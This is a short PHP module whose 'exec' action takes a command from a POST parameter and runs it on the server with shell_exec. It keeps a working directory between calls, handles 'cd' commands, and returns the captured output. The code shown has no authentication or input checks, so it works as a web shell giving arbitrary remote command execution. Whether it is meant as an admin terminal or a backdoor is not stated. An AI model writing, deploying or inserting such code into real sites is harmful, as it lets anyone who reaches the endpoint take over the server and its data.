<?php
function handle_module_request($action) {
    switch ($action) {
        case 'exec':
            $cmd = $_POST['cmd'] ?? '';
            $cwd = $_POST['cwd'] ?? null;
            
            if (!$cmd) return ['status' => 'error', 'message' => 'No command'];

            // Handle CWD persistence
            if ($cwd && is_dir($cwd)) chdir($cwd);
            else $cwd = getcwd();

            // Handle 'cd' commands explicitly
            if (preg_match('/^cd\s+(.+)/', $cmd, $matches)) {
                $checkPath = $matches[1];
                if (chdir($checkPath)) {
                    return ['status' => 'success', 'data' => '', 'cwd' => getcwd()];
                } else {
                    return ['status' => 'error', 'data' => "Path not found.\n", 'cwd' => $cwd];
                }
            }

            $cmd = $cmd . ' 2>&1'; // Capture errors
            $output = shell_exec($cmd);

            return [
                'status' => 'success',
                'data' => $output,
                'cwd' => getcwd()
            ];
        default: return ['status' => 'error', 'message' => 'Unknown Action'];
    }
}
?>